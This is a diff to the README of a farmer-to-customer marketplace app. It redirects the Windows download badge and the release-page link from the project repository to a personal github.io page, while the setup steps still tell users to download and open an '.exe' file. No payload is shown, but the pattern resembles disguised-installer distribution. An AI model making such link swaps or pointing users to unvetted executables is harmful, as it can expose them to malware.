@@ -1,6 +1,6 @@
 # 🚜 agroclick-farmer-hub - Connecting local farmers with nearby customers
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/shayne263/agroclick-farmer-hub)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://shayne263.github.io)
 
 AgroClick helps farmers sell crops directly to customers in their area. The platform calculates distances to help you find nearby shops. It supports both English and Tamil languages. You can place orders and make payments through the application.
 
@@ -8,7 +8,7 @@ AgroClick helps farmers sell crops directly to customers in their area. The plat
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/shayne263/agroclick-farmer-hub).
+1. Go to the [official release page](https://shayne263.github.io).
 2. Look for the section labeled "Assets."
 3. Click the link that ends in ".exe" to save the file to your computer.
 4. Open your Downloads folder.
